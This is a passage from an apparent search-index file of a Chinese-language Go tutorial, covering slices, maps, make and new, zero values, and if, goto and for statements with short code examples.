{5, 6, 7, 8}}\n</code></pre> \u6570\u7ec4\u7684\u5206\u914d\u5982\u4e0b\u6240\u793a\uff1a</p> <p></p> <p>\u56fe2.2 \u591a\u7ef4\u6570\u7ec4\u7684\u6620\u5c04\u5173\u7cfb</p>"},{"location":"02.2/#slice","title":"slice","text":"<p>\u5728\u5f88\u591a\u5e94\u7528\u573a\u666f\u4e2d\uff0c\u6570\u7ec4\u5e76\u4e0d\u80fd\u6ee1\u8db3\u6211\u4eec\u7684\u9700\u6c42\u3002\u5728\u521d\u59cb\u5b9a\u4e49\u6570\u7ec4\u65f6\uff0c\u6211\u4eec\u5e76\u4e0d\u77e5\u9053\u9700\u8981\u591a\u5927\u7684\u6570\u7ec4\uff0c\u56e0\u6b64\u6211\u4eec\u5c31\u9700\u8981\u201c\u52a8\u6001\u6570\u7ec4\u201d\u3002\u5728Go\u91cc\u9762\u8fd9\u79cd\u6570\u636e\u7ed3\u6784\u53eb<code>slice</code></p> <p><code>slice</code>\u5e76\u4e0d\u662f\u771f\u6b63\u610f\u4e49\u4e0a\u7684\u52a8\u6001\u6570\u7ec4\uff0c\u800c\u662f\u4e00\u4e2a\u5f15\u7528\u7c7b\u578b\u3002<code>slice</code>\u603b\u662f\u6307\u5411\u4e00\u4e2a\u5e95\u5c42<code>array</code>\uff0c<code>slice</code>\u7684\u58f0\u660e\u4e5f\u53ef\u4ee5\u50cf<code>array</code>\u4e00\u6837\uff0c\u53ea\u662f\u4e0d\u9700\u8981\u957f\u5ea6\u3002 <pre><code>// \u548c\u58f0\u660earray\u4e00\u6837\uff0c\u53ea\u662f\u5c11\u4e86\u957f\u5ea6\nvar fslice []int\n</code></pre> \u63a5\u4e0b\u6765\u6211\u4eec\u53ef\u4ee5\u58f0\u660e\u4e00\u4e2a<code>slice</code>\uff0c\u5e76\u521d\u59cb\u5316\u6570\u636e\uff0c\u5982\u4e0b\u6240\u793a\uff1a <pre><code>slice := []byte {'a', 'b', 'c', 'd'}\n</code></pre> <code>slice</code>\u53ef\u4ee5\u4ece\u4e00\u4e2a\u6570\u7ec4\u6216\u4e00\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684<code>slice</code>\u4e2d\u518d\u6b21\u58f0\u660e\u3002<code>slice</code>\u901a\u8fc7<code>array[i:j]</code>\u6765\u83b7\u53d6\uff0c\u5176\u4e2d<code>i</code>\u662f\u6570\u7ec4\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c<code>j</code>\u662f\u7ed3\u675f\u4f4d\u7f6e\uff0c\u4f46\u4e0d\u5305\u542b<code>array[j]</code>\uff0c\u5b83\u7684\u957f\u5ea6\u662f<code>j-i</code>\u3002 <pre><code>// \u58f0\u660e\u4e00\u4e2a\u542b\u670910\u4e2a\u5143\u7d20\u5143\u7d20\u7c7b\u578b\u4e3abyte\u7684\u6570\u7ec4\nvar ar = [10]byte {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'}\n\n// \u58f0\u660e\u4e24\u4e2a\u542b\u6709byte\u7684slice\nvar a, b []byte\n\n// a\u6307\u5411\u6570\u7ec4\u7684\u7b2c3\u4e2a\u5143\u7d20\u5f00\u59cb\uff0c\u5e76\u5230\u7b2c\u4e94\u4e2a\u5143\u7d20\u7ed3\u675f\uff0c\na = ar[2:5]\n//\u73b0\u5728a\u542b\u6709\u7684\u5143\u7d20: ar[2]\u3001ar[3]\u548car[4]\n\n// b\u662f\u6570\u7ec4ar\u7684\u53e6\u4e00\u4e2aslice\nb = ar[3:5]\n// b\u7684\u5143\u7d20\u662f\uff1aar[3]\u548car[4]\n</code></pre></p> <p>\u6ce8\u610f<code>slice</code>\u548c\u6570\u7ec4\u5728\u58f0\u660e\u65f6\u7684\u533a\u522b\uff1a\u58f0\u660e\u6570\u7ec4\u65f6\uff0c\u65b9\u62ec\u53f7\u5185\u5199\u660e\u4e86\u6570\u7ec4\u7684\u957f\u5ea6\u6216\u4f7f\u7528<code>...</code>\u81ea\u52a8\u8ba1\u7b97\u957f\u5ea6\uff0c\u800c\u58f0\u660e<code>slice</code>\u65f6\uff0c\u65b9\u62ec\u53f7\u5185\u6ca1\u6709\u4efb\u4f55\u5b57\u7b26\u3002</p> <p>\u5b83\u4eec\u7684\u6570\u636e\u7ed3\u6784\u5982\u4e0b\u6240\u793a</p> <p></p> <p>\u56fe2.3 slice\u548carray\u7684\u5bf9\u5e94\u5173\u7cfb\u56fe</p> <p>slice\u6709\u4e00\u4e9b\u7b80\u4fbf\u7684\u64cd\u4f5c</p> <ul> <li><code>slice</code>\u7684\u9ed8\u8ba4\u5f00\u59cb\u4f4d\u7f6e\u662f0\uff0c<code>ar[:n]</code>\u7b49\u4ef7\u4e8e<code>ar[0:n]</code></li> <li><code>slice</code>\u7684\u7b2c\u4e8c\u4e2a\u5e8f\u5217\u9ed8\u8ba4\u662f\u6570\u7ec4\u7684\u957f\u5ea6\uff0c<code>ar[n:]</code>\u7b49\u4ef7\u4e8e<code>ar[n:len(ar)]</code></li> <li>\u5982\u679c\u4ece\u4e00\u4e2a\u6570\u7ec4\u91cc\u9762\u76f4\u63a5\u83b7\u53d6<code>slice</code>\uff0c\u53ef\u4ee5\u8fd9\u6837<code>ar[:]</code>\uff0c\u56e0\u4e3a\u9ed8\u8ba4\u7b2c\u4e00\u4e2a\u5e8f\u5217\u662f0\uff0c\u7b2c\u4e8c\u4e2a\u662f\u6570\u7ec4\u7684\u957f\u5ea6\uff0c\u5373\u7b49\u4ef7\u4e8e<code>ar[0:len(ar)]</code></li> </ul> <p>\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\u5c55\u793a\u4e86\u66f4\u591a\u5173\u4e8e<code>slice</code>\u7684\u64cd\u4f5c\uff1a <pre><code>// \u58f0\u660e\u4e00\u4e2a\u6570\u7ec4\nvar array = [10]byte{'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'}\n// \u58f0\u660e\u4e24\u4e2aslice\nvar aSlice, bSlice []byte\n\n// \u6f14\u793a\u4e00\u4e9b\u7b80\u4fbf\u64cd\u4f5c\naSlice = array[:3] // \u7b49\u4ef7\u4e8eaSlice = array[0:3] aSlice\u5305\u542b\u5143\u7d20: a,b,c\naSlice = array[5:] // \u7b49\u4ef7\u4e8eaSlice = array[5:10] aSlice\u5305\u542b\u5143\u7d20: f,g,h,i,j\naSlice = array[:]  // \u7b49\u4ef7\u4e8eaSlice = array[0:10] \u8fd9\u6837aSlice\u5305\u542b\u4e86\u5168\u90e8\u7684\u5143\u7d20\n\n// \u4eceslice\u4e2d\u83b7\u53d6slice\naSlice = array[3:7]  // aSlice\u5305\u542b\u5143\u7d20: d,e,f,g\uff0clen=4\uff0ccap=7\nbSlice = aSlice[1:3] // bSlice \u5305\u542baSlice[1], aSlice[2] \u4e5f\u5c31\u662f\u542b\u6709: e,f\nbSlice = aSlice[:3]  // bSlice \u5305\u542b aSlice[0], aSlice[1], aSlice[2] \u4e5f\u5c31\u662f\u542b\u6709: d,e,f\nbSlice = aSlice[0:5] // \u5bf9slice\u7684slice\u53ef\u4ee5\u5728cap\u8303\u56f4\u5185\u6269\u5c55\uff0c\u6b64\u65f6bSlice\u5305\u542b\uff1ad,e,f,g,h\nbSlice = aSlice[:]   // bSlice\u5305\u542b\u6240\u6709aSlice\u7684\u5143\u7d20: d,e,f,g\n</code></pre> <code>slice</code>\u662f\u5f15\u7528\u7c7b\u578b\uff0c\u6240\u4ee5\u5f53\u5f15\u7528\u6539\u53d8\u5176\u4e2d\u5143\u7d20\u7684\u503c\u65f6\uff0c\u5176\u5b83\u7684\u6240\u6709\u5f15\u7528\u90fd\u4f1a\u6539\u53d8\u8be5\u503c\uff0c\u4f8b\u5982\u4e0a\u9762\u7684<code>aSlice</code>\u548c<code>bSlice</code>\uff0c\u5982\u679c\u4fee\u6539\u4e86<code>aSlice</code>\u4e2d\u5143\u7d20\u7684\u503c\uff0c\u90a3\u4e48<code>bSlice</code>\u76f8\u5bf9\u5e94\u7684\u503c\u4e5f\u4f1a\u6539\u53d8\u3002</p> <p>\u4ece\u6982\u5ff5\u4e0a\u9762\u6765\u8bf4<code>slice</code>\u50cf\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u8fd9\u4e2a\u7ed3\u6784\u4f53\u5305\u542b\u4e86\u4e09\u4e2a\u5143\u7d20\uff1a - \u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411\u6570\u7ec4\u4e2d<code>slice</code>\u6307\u5b9a\u7684\u5f00\u59cb\u4f4d\u7f6e - \u957f\u5ea6\uff0c\u5373<code>slice</code>\u7684\u957f\u5ea6 - \u6700\u5927\u957f\u5ea6\uff0c\u4e5f\u5c31\u662f<code>slice</code>\u5f00\u59cb\u4f4d\u7f6e\u5230\u6570\u7ec4\u7684\u6700\u540e\u4f4d\u7f6e\u7684\u957f\u5ea6 <pre><code>    Array_a := [10]byte{'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'}\nSlice_a := Array_a[2:5]\n</code></pre> \u4e0a\u9762\u4ee3\u7801\u7684\u771f\u6b63\u5b58\u50a8\u7ed3\u6784\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p> <p>\u56fe2.4 slice\u5bf9\u5e94\u6570\u7ec4\u7684\u4fe1\u606f</p> <p>\u5bf9\u4e8e<code>slice</code>\u6709\u51e0\u4e2a\u6709\u7528\u7684\u5185\u7f6e\u51fd\u6570\uff1a</p> <ul> <li><code>len</code>    \u83b7\u53d6<code>slice</code>\u7684\u957f\u5ea6</li> <li><code>cap</code>    \u83b7\u53d6<code>slice</code>\u7684\u6700\u5927\u5bb9\u91cf</li> <li><code>append</code> \u5411<code>slice</code>\u91cc\u9762\u8ffd\u52a0\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u5143\u7d20\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u548c<code>slice</code>\u4e00\u6837\u7c7b\u578b\u7684<code>slice</code></li> <li><code>copy</code>   \u51fd\u6570<code>copy</code>\u4ece\u6e90<code>slice</code>\u7684<code>src</code>\u4e2d\u590d\u5236\u5143\u7d20\u5230\u76ee\u6807<code>dst</code>\uff0c\u5e76\u4e14\u8fd4\u56de\u590d\u5236\u7684\u5143\u7d20\u7684\u4e2a\u6570</li> </ul> <p>\u6ce8\uff1a<code>append</code>\u51fd\u6570\u4f1a\u6539\u53d8<code>slice</code>\u6240\u5f15\u7528\u7684\u6570\u7ec4\u7684\u5185\u5bb9\uff0c\u4ece\u800c\u5f71\u54cd\u5230\u5f15\u7528\u540c\u4e00\u6570\u7ec4\u7684\u5176\u5b83<code>slice</code>\u3002 \u4f46\u5f53<code>slice</code>\u4e2d\u6ca1\u6709\u5269\u4f59\u7a7a\u95f4\uff08\u5373<code>(cap-len) == 0</code>\uff09\u65f6\uff0c\u6b64\u65f6\u5c06\u52a8\u6001\u5206\u914d\u65b0\u7684\u6570\u7ec4\u7a7a\u95f4\u3002\u8fd4\u56de\u7684<code>slice</code>\u6570\u7ec4\u6307\u9488\u5c06\u6307\u5411\u8fd9\u4e2a\u7a7a\u95f4\uff0c\u800c\u539f\u6570\u7ec4\u7684\u5185\u5bb9\u5c06\u4fdd\u6301\u4e0d\u53d8\uff1b\u5176\u5b83\u5f15\u7528\u6b64\u6570\u7ec4\u7684<code>slice</code>\u5219\u4e0d\u53d7\u5f71\u54cd\u3002</p> <p>\u4eceGo1.2\u5f00\u59cbslice\u652f\u6301\u4e86\u4e09\u4e2a\u53c2\u6570\u7684slice\uff0c\u4e4b\u524d\u6211\u4eec\u4e00\u76f4\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\u5728slice\u6216\u8005array\u57fa\u7840\u4e0a\u6765\u83b7\u53d6\u4e00\u4e2aslice <pre><code>var array [10]int\nslice := array[2:4]\n</code></pre> \u8fd9\u4e2a\u4f8b\u5b50\u91cc\u9762slice\u7684\u5bb9\u91cf\u662f8\uff0c\u65b0\u7248\u672c\u91cc\u9762\u53ef\u4ee5\u6307\u5b9a\u8fd9\u4e2a\u5bb9\u91cf</p> <pre><code>slice = array[2:4:7]\n</code></pre> <p>\u4e0a\u9762\u8fd9\u4e2a\u7684\u5bb9\u91cf\u5c31\u662f<code>7-2</code>\uff0c\u53735\u3002\u8fd9\u6837\u8fd9\u4e2a\u4ea7\u751f\u7684\u65b0\u7684slice\u5c31\u6ca1\u529e\u6cd5\u8bbf\u95ee\u6700\u540e\u7684\u4e09\u4e2a\u5143\u7d20\u3002</p> <p>\u5982\u679cslice\u662f\u8fd9\u6837\u7684\u5f62\u5f0f<code>array[:i:j]</code>\uff0c\u5373\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u7a7a\uff0c\u9ed8\u8ba4\u503c\u5c31\u662f0\u3002</p>"},{"location":"02.2/#map","title":"map","text":"<p><code>map</code>\u4e5f\u5c31\u662fPython\u4e2d\u5b57\u5178\u7684\u6982\u5ff5\uff0c\u5b83\u7684\u683c\u5f0f\u4e3a<code>map[keyType]valueType</code></p> <p>\u6211\u4eec\u770b\u4e0b\u9762\u7684\u4ee3\u7801\uff0c<code>map</code>\u7684\u8bfb\u53d6\u548c\u8bbe\u7f6e\u4e5f\u7c7b\u4f3c<code>slice</code>\u4e00\u6837\uff0c\u901a\u8fc7<code>key</code>\u6765\u64cd\u4f5c\uff0c\u53ea\u662f<code>slice</code>\u7684<code>index</code>\u53ea\u80fd\u662f\uff40int\uff40\u7c7b\u578b\uff0c\u800c<code>map</code>\u591a\u4e86\u5f88\u591a\u7c7b\u578b\uff0c\u53ef\u4ee5\u662f<code>int</code>\uff0c\u53ef\u4ee5\u662f<code>string</code>\u53ca\u6240\u6709\u5b8c\u5168\u5b9a\u4e49\u4e86<code>==</code>\u4e0e<code>!=</code>\u64cd\u4f5c\u7684\u7c7b\u578b\u3002 <pre><code>// \u58f0\u660e\u4e00\u4e2akey\u662f\u5b57\u7b26\u4e32\uff0c\u503c\u4e3aint\u7684\u5b57\u5178,\u8fd9\u79cd\u65b9\u5f0f\u7684\u58f0\u660e\u9700\u8981\u5728\u4f7f\u7528\u4e4b\u524d\u4f7f\u7528make\u521d\u59cb\u5316\nvar numbers map[string]int\n// \u53e6\u4e00\u79cdmap\u7684\u58f0\u660e\u65b9\u5f0f\nnumbers = make(map[string]int)\nnumbers[\"one\"] = 1  //\u8d4b\u503c\nnumbers[\"ten\"] = 10 //\u8d4b\u503c\nnumbers[\"three\"] = 3\n\nfmt.Println(\"\u7b2c\u4e09\u4e2a\u6570\u5b57\u662f: \", numbers[\"three\"]) // \u8bfb\u53d6\u6570\u636e\n// \u6253\u5370\u51fa\u6765\u5982:\u7b2c\u4e09\u4e2a\u6570\u5b57\u662f: 3\n</code></pre></p> <p>\u8fd9\u4e2a<code>map</code>\u5c31\u50cf\u6211\u4eec\u5e73\u5e38\u770b\u5230\u7684\u8868\u683c\u4e00\u6837\uff0c\u5de6\u8fb9\u5217\u662f<code>key</code>\uff0c\u53f3\u8fb9\u5217\u662f\u503c</p> <p>\u4f7f\u7528map\u8fc7\u7a0b\u4e2d\u9700\u8981\u6ce8\u610f\u7684\u51e0\u70b9\uff1a - <code>map</code>\u662f\u65e0\u5e8f\u7684\uff0c\u6bcf\u6b21\u6253\u5370\u51fa\u6765\u7684<code>map</code>\u90fd\u4f1a\u4e0d\u4e00\u6837\uff0c\u5b83\u4e0d\u80fd\u901a\u8fc7<code>index</code>\u83b7\u53d6\uff0c\u800c\u5fc5\u987b\u901a\u8fc7<code>key</code>\u83b7\u53d6 - <code>map</code>\u7684\u957f\u5ea6\u662f\u4e0d\u56fa\u5b9a\u7684\uff0c\u4e5f\u5c31\u662f\u548c<code>slice</code>\u4e00\u6837\uff0c\u4e5f\u662f\u4e00\u79cd\u5f15\u7528\u7c7b\u578b - \u5185\u7f6e\u7684<code>len</code>\u51fd\u6570\u540c\u6837\u9002\u7528\u4e8e<code>map</code>\uff0c\u8fd4\u56de<code>map</code>\u62e5\u6709\u7684<code>key</code>\u7684\u6570\u91cf - <code>map</code>\u7684\u503c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u4fee\u6539\uff0c\u901a\u8fc7<code>numbers[\"one\"]=11</code>\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u628akey\u4e3a<code>one</code>\u7684\u5b57\u5178\u503c\u6539\u4e3a<code>11</code> - <code>map</code>\u548c\u5176\u4ed6\u57fa\u672c\u578b\u522b\u4e0d\u540c\uff0c\u5b83\u4e0d\u662fthread-safe\uff0c\u5728\u591a\u4e2ago-routine\u5b58\u53d6\u65f6\uff0c\u5fc5\u987b\u4f7f\u7528mutex lock\u673a\u5236</p> <p><code>map</code>\u7684\u521d\u59cb\u5316\u53ef\u4ee5\u901a\u8fc7<code>key:val</code>\u7684\u65b9\u5f0f\u521d\u59cb\u5316\u503c\uff0c\u540c\u65f6<code>map</code>\u5185\u7f6e\u6709\u5224\u65ad\u662f\u5426\u5b58\u5728<code>key</code>\u7684\u65b9\u5f0f</p> <p>\u901a\u8fc7<code>delete</code>\u5220\u9664<code>map</code>\u7684\u5143\u7d20\uff1a</p> <p><pre><code>// \u521d\u59cb\u5316\u4e00\u4e2a\u5b57\u5178\nrating := map[string]float32{\"C\":5, \"Go\":4.5, \"Python\":4.5, \"C++\":2 }\n// map\u6709\u4e24\u4e2a\u8fd4\u56de\u503c\uff0c\u7b2c\u4e8c\u4e2a\u8fd4\u56de\u503c\uff0c\u5982\u679c\u4e0d\u5b58\u5728key\uff0c\u90a3\u4e48ok\u4e3afalse\uff0c\u5982\u679c\u5b58\u5728ok\u4e3atrue\ncsharpRating, ok := rating[\"C#\"]\nif ok {\nfmt.Println(\"C# is in the map and its rating is \", csharpRating)\n} else {\nfmt.Println(\"We have no rating associated with C# in the map\")\n}\n\ndelete(rating, \"C\")  // \u5220\u9664key\u4e3aC\u7684\u5143\u7d20\n</code></pre> \u4e0a\u9762\u8bf4\u8fc7\u4e86\uff0c<code>map</code>\u4e5f\u662f\u4e00\u79cd\u5f15\u7528\u7c7b\u578b\uff0c\u5982\u679c\u4e24\u4e2a<code>map</code>\u540c\u65f6\u6307\u5411\u4e00\u4e2a\u5e95\u5c42\uff0c\u90a3\u4e48\u4e00\u4e2a\u6539\u53d8\uff0c\u53e6\u4e00\u4e2a\u4e5f\u76f8\u5e94\u7684\u6539\u53d8\uff1a <pre><code>m := make(map[string]string)\nm[\"Hello\"] = \"Bonjour\"\nm1 := m\nm1[\"Hello\"] = \"Salut\"  // \u73b0\u5728m[\"hello\"]\u7684\u503c\u5df2\u7ecf\u662fSalut\u4e86\n</code></pre></p>"},{"location":"02.2/#makenew","title":"make\u3001new\u64cd\u4f5c","text":"<p><code>make</code>\u7528\u4e8e\u5185\u5efa\u7c7b\u578b\uff08<code>map</code>\u3001<code>slice</code> \u548c<code>channel</code>\uff09\u7684\u5185\u5b58\u5206\u914d\u3002<code>new</code>\u7528\u4e8e\u5404\u79cd\u7c7b\u578b\u7684\u5185\u5b58\u5206\u914d\u3002</p> <p>\u5185\u5efa\u51fd\u6570<code>new</code>\u672c\u8d28\u4e0a\u8bf4\u8ddf\u5176\u5b83\u8bed\u8a00\u4e2d\u7684\u540c\u540d\u51fd\u6570\u529f\u80fd\u4e00\u6837\uff1a<code>new(T)</code>\u5206\u914d\u4e86\u96f6\u503c\u586b\u5145\u7684<code>T</code>\u7c7b\u578b\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u5e76\u4e14\u8fd4\u56de\u5176\u5730\u5740\uff0c\u5373\u4e00\u4e2a<code>*T</code>\u7c7b\u578b\u7684\u503c\u3002\u7528Go\u7684\u672f\u8bed\u8bf4\uff0c\u5b83\u8fd4\u56de\u4e86\u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411\u65b0\u5206\u914d\u7684\u7c7b\u578b<code>T</code>\u7684\u96f6\u503c\u3002\u6709\u4e00\u70b9\u975e\u5e38\u91cd\u8981\uff1a</p> <p><code>new</code>\u8fd4\u56de\u6307\u9488\u3002</p> <p>\u5185\u5efa\u51fd\u6570<code>make(T, args)</code>\u4e0e<code>new(T)</code>\u6709\u7740\u4e0d\u540c\u7684\u529f\u80fd\uff0cmake\u53ea\u80fd\u521b\u5efa<code>slice</code>\u3001<code>map</code>\u548c<code>channel</code>\uff0c\u5e76\u4e14\u8fd4\u56de\u4e00\u4e2a\u6709\u521d\u59cb\u503c(\u975e\u96f6)\u7684<code>T</code>\u7c7b\u578b\uff0c\u800c\u4e0d\u662f<code>*T</code>\u3002\u672c\u8d28\u6765\u8bb2\uff0c\u5bfc\u81f4\u8fd9\u4e09\u4e2a\u7c7b\u578b\u6709\u6240\u4e0d\u540c\u7684\u539f\u56e0\u662f\u6307\u5411\u6570\u636e\u7ed3\u6784\u7684\u5f15\u7528\u5728\u4f7f\u7528\u524d\u5fc5\u987b\u88ab\u521d\u59cb\u5316\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a<code>slice</code>\uff0c\u662f\u4e00\u4e2a\u5305\u542b\u6307\u5411\u6570\u636e\uff08\u5185\u90e8<code>array</code>\uff09\u7684\u6307\u9488\u3001\u957f\u5ea6\u548c\u5bb9\u91cf\u7684\u4e09\u9879\u63cf\u8ff0\u7b26\uff1b\u5728\u8fd9\u4e9b\u9879\u76ee\u88ab\u521d\u59cb\u5316\u4e4b\u524d\uff0c<code>slice</code>\u4e3a<code>nil</code>\u3002\u5bf9\u4e8e<code>slice</code>\u3001<code>map</code>\u548c<code>channel</code>\u6765\u8bf4\uff0c<code>make</code>\u521d\u59cb\u5316\u4e86\u5185\u90e8\u7684\u6570\u636e\u7ed3\u6784\uff0c\u586b\u5145\u9002\u5f53\u7684\u503c\u3002</p> <p><code>make</code>\u8fd4\u56de\u521d\u59cb\u5316\u540e\u7684\uff08\u975e\u96f6\uff09\u503c\u3002</p> <p>\u4e0b\u9762\u8fd9\u4e2a\u56fe\u8be6\u7ec6\u7684\u89e3\u91ca\u4e86<code>new</code>\u548c<code>make</code>\u4e4b\u95f4\u7684\u533a\u522b\u3002</p> <p></p> <p>\u56fe2.5 make\u548cnew\u5bf9\u5e94\u5e95\u5c42\u7684\u5185\u5b58\u5206\u914d</p>"},{"location":"02.2/#_9","title":"\u96f6\u503c","text":"<p>\u5173\u4e8e\u201c\u96f6\u503c\u201d\uff0c\u6240\u6307\u5e76\u975e\u662f\u7a7a\u503c\uff0c\u800c\u662f\u4e00\u79cd\u201c\u53d8\u91cf\u672a\u586b\u5145\u524d\u201d\u7684\u9ed8\u8ba4\u503c\uff0c\u901a\u5e38\u4e3a0\u3002 \u6b64\u5904\u7f57\u5217 \u90e8\u5206\u7c7b\u578b \u7684 \u201c\u96f6\u503c\u201d <pre><code>int     0\nint8    0\nint32   0\nint64   0\nuint    0x0\nrune    0 //rune\u7684\u5b9e\u9645\u7c7b\u578b\u662f int32\nbyte    0x0 // byte\u7684\u5b9e\u9645\u7c7b\u578b\u662f uint8\nfloat32 0 //\u957f\u5ea6\u4e3a 4 byte\nfloat64 0 //\u957f\u5ea6\u4e3a 8 byte\nbool    false\nstring  \"\"\n</code></pre></p>"},{"location":"02.2/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u4f60\u597d,Go</li> <li>\u4e0b\u4e00\u8282: \u6d41\u7a0b\u548c\u51fd\u6570</li> </ul>"},{"location":"02.3/","title":"2.3 \u6d41\u7a0b\u548c\u51fd\u6570","text":"<p>\u8fd9\u5c0f\u8282\u6211\u4eec\u8981\u4ecb\u7ecdGo\u91cc\u9762\u7684\u6d41\u7a0b\u63a7\u5236\u4ee5\u53ca\u51fd\u6570\u64cd\u4f5c\u3002</p>"},{"location":"02.3/#_1","title":"\u6d41\u7a0b\u63a7\u5236","text":"<p>\u6d41\u7a0b\u63a7\u5236\u5728\u7f16\u7a0b\u8bed\u8a00\u4e2d\u662f\u6700\u4f1f\u5927\u7684\u53d1\u660e\u4e86\uff0c\u56e0\u4e3a\u6709\u4e86\u5b83\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u5f88\u7b80\u5355\u7684\u6d41\u7a0b\u63cf\u8ff0\u6765\u8868\u8fbe\u5f88\u590d\u6742\u7684\u903b\u8f91\u3002Go\u4e2d\u6d41\u7a0b\u63a7\u5236\u5206\u4e09\u5927\u7c7b\uff1a\u6761\u4ef6\u5224\u65ad\uff0c\u5faa\u73af\u63a7\u5236\u548c\u65e0\u6761\u4ef6\u8df3\u8f6c\u3002</p>"},{"location":"02.3/#if","title":"if","text":"<p><code>if</code>\u4e5f\u8bb8\u662f\u5404\u79cd\u7f16\u7a0b\u8bed\u8a00\u4e2d\u6700\u5e38\u89c1\u7684\u4e86\uff0c\u5b83\u7684\u8bed\u6cd5\u6982\u62ec\u8d77\u6765\u5c31\u662f\uff1a\u5982\u679c\u6ee1\u8db3\u6761\u4ef6\u5c31\u505a\u67d0\u4e8b\uff0c\u5426\u5219\u505a\u53e6\u4e00\u4ef6\u4e8b\u3002</p> <p>Go\u91cc\u9762<code>if</code>\u6761\u4ef6\u5224\u65ad\u8bed\u53e5\u4e2d\u4e0d\u9700\u8981\u62ec\u53f7\uff0c\u5982\u4e0b\u4ee3\u7801\u6240\u793a <pre><code>if x &gt; 10 {\nfmt.Println(\"x is greater than 10\")\n} else {\nfmt.Println(\"x is less than 10\")\n}\n</code></pre> Go\u7684<code>if</code>\u8fd8\u6709\u4e00\u4e2a\u5f3a\u5927\u7684\u5730\u65b9\u5c31\u662f\u6761\u4ef6\u5224\u65ad\u8bed\u53e5\u91cc\u9762\u5141\u8bb8\u58f0\u660e\u4e00\u4e2a\u53d8\u91cf\uff0c\u8fd9\u4e2a\u53d8\u91cf\u7684\u4f5c\u7528\u57df\u53ea\u80fd\u5728\u8be5\u6761\u4ef6\u903b\u8f91\u5757\u5185\uff0c\u5176\u4ed6\u5730\u65b9\u5c31\u4e0d\u8d77\u4f5c\u7528\u4e86\uff0c\u5982\u4e0b\u6240\u793a <pre><code>// \u8ba1\u7b97\u83b7\u53d6\u503cx,\u7136\u540e\u6839\u636ex\u8fd4\u56de\u7684\u5927\u5c0f\uff0c\u5224\u65ad\u662f\u5426\u5927\u4e8e10\u3002\nif x := computedValue(); x &gt; 10 {\nfmt.Println(\"x is greater than 10\")\n} else {\nfmt.Println(\"x is less than 10\")\n}\n\n//\u8fd9\u4e2a\u5730\u65b9\u5982\u679c\u8fd9\u6837\u8c03\u7528\u5c31\u7f16\u8bd1\u51fa\u9519\u4e86\uff0c\u56e0\u4e3ax\u662f\u6761\u4ef6\u91cc\u9762\u7684\u53d8\u91cf\nfmt.Println(x)\n</code></pre> \u591a\u4e2a\u6761\u4ef6\u7684\u65f6\u5019\u5982\u4e0b\u6240\u793a\uff1a <pre><code>if integer == 3 {\nfmt.Println(\"The integer is equal to 3\")\n} else if integer &lt; 3 {\nfmt.Println(\"The integer is less than 3\")\n} else {\nfmt.Println(\"The integer is greater than 3\")\n}\n</code></pre></p>"},{"location":"02.3/#goto","title":"goto","text":"<p>Go\u6709<code>goto</code>\u8bed\u53e5\u2014\u2014\u8bf7\u660e\u667a\u5730\u4f7f\u7528\u5b83\u3002\u7528<code>goto</code>\u8df3\u8f6c\u5230\u5fc5\u987b\u5728\u5f53\u524d\u51fd\u6570\u5185\u5b9a\u4e49\u7684\u6807\u7b7e\u3002\u4f8b\u5982\u5047\u8bbe\u8fd9\u6837\u4e00\u4e2a\u5faa\u73af\uff1a <pre><code>func myFunc() {\ni := 0\nHere:   //\u8fd9\u884c\u7684\u7b2c\u4e00\u4e2a\u8bcd\uff0c\u4ee5\u5192\u53f7\u7ed3\u675f\u4f5c\u4e3a\u6807\u7b7e\nprintln(i)\ni++\ngoto Here   //\u8df3\u8f6c\u5230Here\u53bb\n}\n</code></pre></p> <p>\u6807\u7b7e\u540d\u662f\u5927\u5c0f\u5199\u654f\u611f\u7684\u3002</p>"},{"location":"02.3/#for","title":"for","text":"<p>Go\u91cc\u9762\u6700\u5f3a\u5927\u7684\u4e00\u4e2a\u63a7\u5236\u903b\u8f91\u5c31\u662f<code>for</code>\uff0c\u5b83\u65e2\u53ef\u4ee5\u7528\u6765\u5faa\u73af\u8bfb\u53d6\u6570\u636e\uff0c\u53c8\u53ef\u4ee5\u5f53\u4f5c<code>while</code>\u6765\u63a7\u5236\u903b\u8f91\uff0c\u8fd8\u80fd\u8fed\u4ee3\u64cd\u4f5c\u3002\u5b83\u7684\u8bed\u6cd5\u5982\u4e0b\uff1a <pre><code>for expression1; expression2; expression3 {\n//...\n}\n</code></pre> <code>expression1</code>\u3001<code>expression2</code>\u548c<code>expression3</code>\u90fd\u662f\u8868\u8fbe\u5f0f\uff0c\u5176\u4e2d<code>expression1</code>\u548c<code>expression3</code>\u662f\u53d8\u91cf\u58f0\u660e\u6216\u8005\u51fd\u6570\u8c03\u7528\u8fd4\u56de\u503c\u4e4b\u7c7b\u7684\uff0c<code>expression2</code>\u662f\u7528\u6765\u6761\u4ef6\u5224\u65ad\uff0c<code>expression1</code>\u5728\u5faa\u73af\u5f00\u59cb\u4e4b\u524d\u8c03\u7528\uff0c<code>expression3</code>\u5728\u6bcf\u8f6e\u5faa\u73af\u7ed3\u675f\u4e4b\u65f6\u8c03\u7528\u3002</p> <p>\u4e00\u4e2a\u4f8b\u5b50\u6bd4\u4e0a\u9762\u8bb2\u90a3\u4e48\u591a\u66f4\u6709\u7528\uff0c\u90a3\u4e48\u6211\u4eec\u770b\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u5427\uff1a <pre><code>package main\n\nimport \"fmt\"\n\nfunc main(){\nsum := 0;\nfor index:=0; index &lt; 10 ; index++ 